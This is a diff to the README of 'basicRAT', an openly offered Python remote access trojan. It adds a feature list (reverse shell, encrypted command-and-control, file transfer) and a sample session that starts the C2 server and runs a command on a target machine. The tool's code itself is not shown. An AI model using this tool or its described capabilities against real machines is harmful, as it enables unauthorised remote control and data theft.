@@ -6,8 +6,36 @@ This is a boilerplate Python RAT (Remote Access Trojan). I created this to maint
 
 ## Features
 * Cross-platform
-* Reverse Shell
 * AES CBC Encrypted C2
+* Reverse Shell
+* File upload/download
+
+## Usage
+```
+$ python basicRAT_server.py 1337
+
+ ____    ____  _____ ____   __  ____    ____  ______      .  ,
+ |    \  /    |/ ___/|    | /  ]|    \  /    ||      |    (\;/)
+ |  o  )|  o  (   \_  |  | /  / |  D  )|  o  ||      |   oo   \//,        _
+ |     ||     |\__  | |  |/  /  |    / |     ||_|  |_| ,/_;~      \,     / '
+ |  O  ||  _  |/  \ | |  /   \_ |    \ |  _  |  |  |   "'    (  (   \    !
+ |     ||  |  |\    | |  \     ||  .  \|  |  |  |  |         //  \   |__.'
+ |_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
+          https://github.com/vesche/basicRAT
+
+basicRAT server listening on port 1337...
+
+basicRAT> help
+
+download <file> - Download a file.
+help            - Show this help menu.
+run <command>   - Execute a command on the target.
+upload <file>   - Upload a file.
+quit            - Gracefully kill client and server.
+
+basicRAT> run uname -a
+Linux sandbox3 4.7.6-1-ARCH #1 SMP PREEMPT Fri Sep 30 19:28:42 CEST 2016 x86_64 GNU/Linux
+```
 
 ## Notes
 * The ELF was created using [PyInstaller](http://www.pyinstaller.org/).
